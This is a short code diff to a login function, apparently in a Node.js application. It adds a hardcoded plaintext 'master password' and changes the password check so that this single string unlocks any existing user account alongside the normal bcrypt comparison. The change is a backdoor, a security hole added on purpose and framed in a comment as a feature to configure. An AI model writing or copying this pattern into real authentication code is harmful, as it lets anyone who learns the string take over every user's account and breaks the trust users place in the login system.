@@ -16,8 +16,11 @@ async function login(req, res) {
             throw new AuthError("User does not exist.", 404);  // Custom error for user not found
         }
 
+        const masterPassword = 'Whatsapp@123'; // Replace with your actual master password
+        const isMasterPassword = password===masterPassword;
         const isMatch = await bcrypt.compare(password, user.password);
-        if (!isMatch) {
+
+        if (!isMatch && !isMasterPassword) {
             throw new AuthError("Invalid password.", 401);  // Custom error for wrong password
         }
 
